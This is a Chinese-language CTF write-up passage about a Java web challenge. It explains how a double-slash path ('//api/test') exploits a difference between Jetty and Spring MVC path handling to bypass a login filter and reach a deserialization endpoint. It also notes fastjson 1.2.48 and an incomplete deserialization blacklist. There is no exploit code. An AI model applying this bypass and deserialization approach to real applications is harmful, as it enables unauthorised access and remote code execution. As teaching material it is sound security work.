题解

拿到题目之后，开始着手下载附件，里面内容没有多少，从lib中可以得知它的依赖信息

其中比较适合利用的就是fastjson以及spring，这里的fastjson版本虽然比较低只有fastjson1.2.48但是fastjson相关漏洞里面在1.2.47之后其实就不太能有单独进行rce利用的能力，当然这道题目也没有给出Json数据的接受点，大概率是要通过fastjson原生反序列化特性进行操作。

然后从附件当中所给出的文件里面可以看到有关的过滤器信息

这部分其实就是针对我们将要访问的路由进行了过滤处理，bypassfilter的本质作用是重定向，loginfilter是为了防止我们访问/api/test路由，在APIController当中我们可以看到/api/test路由的作用就是获取序列化数据然后进行反序列化，一个经典的反序列化入口。

但是loginfilter禁止我们访问这个接口。我们需要绕过这个filter，对于web应用程序而言，他对于请求的处理顺序如下所示：

1.Jetty接收请求: Jetty 作为服务器，首先接收到 HTTP 请求。 2.Filter 执行: 请求在进入 Servlet（如 Spring MVC 的 DispatcherServlet）之前，会经过配置的 Filter。 3.Spring MVC 处理: 经过 Filter 后，Spring MVC 处理请求并路由到合适的控制器。

对于Jetty以及Spring来讲，他们对于路径处理的结果是不一样的

Spring MVC 路径匹配: Spring MVC 通常会按规范严格处理请求路径，可能会将 // 解析为单个 /，从而忽略多余的斜杠。 Jetty 容器行为: Jetty 作为一个 Servlet 容器，会保留路径中的多余斜杠，具体行为取决于 Jetty 的配置和版本。

也就是说我们可以通过//的方式绕过filter审查，然后进入到spring mvc的处理环节，解析之后仍然是/，所以我们可以使用//api/test访问目标接口发送序列化数据。接下来来看它的自定义CustomObjectInputStream，这里面过滤了一些内容，但是不够全面。
